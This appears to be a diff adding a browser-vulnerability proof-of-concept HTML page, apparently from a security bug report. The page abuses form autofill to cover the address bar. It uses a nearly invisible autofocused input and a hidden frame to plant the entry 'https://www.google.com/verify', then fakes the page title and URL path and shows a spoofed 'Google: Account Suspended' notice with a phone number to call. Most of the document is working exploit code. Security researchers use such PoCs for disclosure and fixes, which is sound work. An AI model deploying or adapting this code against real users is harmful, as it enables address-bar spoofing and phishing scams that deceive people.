@@ -1,1 +1,103 @@
-<iframe src="https://bug1771685.bmoattachments.org/attachment.cgi?id=9278689"></iframe>
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+body { overflow: hidden; }
+iframe.formFrame { width: 1px; height: 1px; opacity: 0.01; }
+#overlayElem {
+  position: absolute; opacity: 0.001; cursor: default; z-index: 5;
+  height: 2px;
+  width: 200px;
+  top: -37px;
+  left: 290px;
+}
+
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; }
+#instructions.hide { display: none; }
+
+#spoofContent { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; font-weight: bold; padding: 0.5em; }
+#spoofContent.show { display: block; }
+</style>
+</head>
+<body>
+<h1>PoC: Autofill over browser UI, address bar</h1>
+<p>Autofill prompt covers address bar, and probably can cover other browser UI.</p>
+
+<p id="output"></p>
+
+<p id="instructions">Please press space once to continue to Google<br>(or press down arrow once)</p>
+
+<input type="text" id="overlayElem" name="alesandroortiz[unique2addressBar]" autofocus autocomplete="on">
+
+<div id="spoofContent">
+<h1>Google: Account Suspended</h1>
+<p>Please call 800-555-5555 to verify and restore your account.</p>
+</div>
+
+<script>
+const trustedOrigin = 'https://alesandroortiz.com';
+
+var barStatusString = 'addressBar';
+
+// Clear value on reload
+overlayElem.value = '';
+
+var createAutofillEntryViaFrame = (entry) => {
+  var frameElem = document.createElement('iframe');
+  frameElem.classList.add('formFrame');
+  frameElem.addEventListener('load', (event) => {
+    if (event.target.contentWindow.location.search.indexOf('submitted') > -1) {
+      // After form submit, remove frame
+      event.target.remove();
+      return;
+    }
+    event.target.contentWindow.postMessage({"entry": entry, "fieldSuffix": '2'+barStatusString}, trustedOrigin);
+  });
+  document.body.appendChild(frameElem); 
+  frameElem.src = 'autofill-setup-frame.html';
+}
+
+// In Firefox, the entries seem to be alphabetically ordered. Therefore entries need to be carefully worded.
+// There may be a way to avoid this, but I haven't figured it out yet.
+createAutofillEntryViaFrame('https://www.google.com/verify');
+
+overlayElem.addEventListener('keydown', (event) => {
+
+  // Do not allow other values to be entered using keyboard
+  overlayElem.value = '';
+
+  // Only process space or down arrow
+  if (event.keyCode != 32 && event.keyCode != 40) {
+    return;
+  }
+
+  instructions.classList.add('hide');
+
+  history.pushState({}, 'Google: Account Suspended', '/verify');
+  document.title = 'Google: Account Suspended';
+  spoofContent.classList.add('show');
+});
+
+setInterval(() => {
+  // If user clicks autofill value, reset
+  // Cannot use change event because it doesn't fire immediately
+  if (overlayElem.value.length > 1) {
+    window.location.reload();
+  } else {
+    overlayElem.focus();
+  }
+}, 100);
+
+var reloadDebounceTimer;
+window.addEventListener('resize', (event) => {
+  clearTimeout(reloadDebounceTimer);
+  reloadDebounceTimer = setTimeout(() => {
+    window.location.reload();
+  }, 300);
+});
+
+</script>
+
+</body>
+</html>
